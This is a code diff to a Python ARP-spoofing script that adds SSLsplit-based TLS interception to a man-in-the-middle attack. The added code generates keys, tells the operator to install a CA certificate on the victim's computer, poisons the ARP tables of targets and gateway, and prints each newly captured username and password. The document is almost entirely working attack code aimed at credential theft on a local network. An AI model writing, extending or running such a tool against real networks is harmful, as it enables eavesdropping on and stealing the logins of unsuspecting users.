@@ -1,7 +1,7 @@
 import scapy.all as scapy
 import time
 import sys
-from MITM_misc import getMask1Bits
+from MITM.MITM_misc import getMask1Bits, runSSLSplit, fetchPasswd
 
 def getGatewayIP():
     result = scapy.conf.route.route("0.0.0.0")[2]
@@ -90,6 +90,11 @@ def restore(targetIP, hostIP, devices, verbose=True):
         print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, hostMAC))
 
 if __name__ == "__main__":
+    import os
+    os.system("sh MITM/genKey.sh")
+    os.system("clear")
+    print("[!] Remember to install MITM/ca.crt into victim's computer")
+
     host = getGatewayIP()
     print("Gateway IP: ", host)
 
@@ -111,6 +116,11 @@ if __name__ == "__main__":
     verbose = False
     # enable ip forwarding
     enable_ip_route()
+
+    sslSplitPid = runSSLSplit()
+
+    visited = []
+
     try:
         while True:
             for target in targets:
@@ -118,6 +128,20 @@ if __name__ == "__main__":
                 spoof(target, host, devices, verbose)
                 # telling the `host` that we are the `target`
                 spoof(host, target, devices, verbose)
+            result = fetchPasswd()
+
+            for item in result:
+                have = False
+                for item2 in visited:
+                    if item2 == item:
+                        have = True
+                        break
+                if have == False:
+                    visited.append(item)
+                    print("Username:  ", item["username"], sep = "")
+                    print("Password:  ", item["password"], sep = "")
+                    print("", sep = "")
+
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
@@ -125,3 +149,7 @@ if __name__ == "__main__":
             restore(target, host, devices, verbose)
             restore(host, target, devices, verbose)
         print("[+] Arp Spoof Stopped")
+
+        print("[!] Turning off sslsplit, please wait...")
+        sslSplitPid.terminate()
+        print("[+] SSLsplit Stopped")
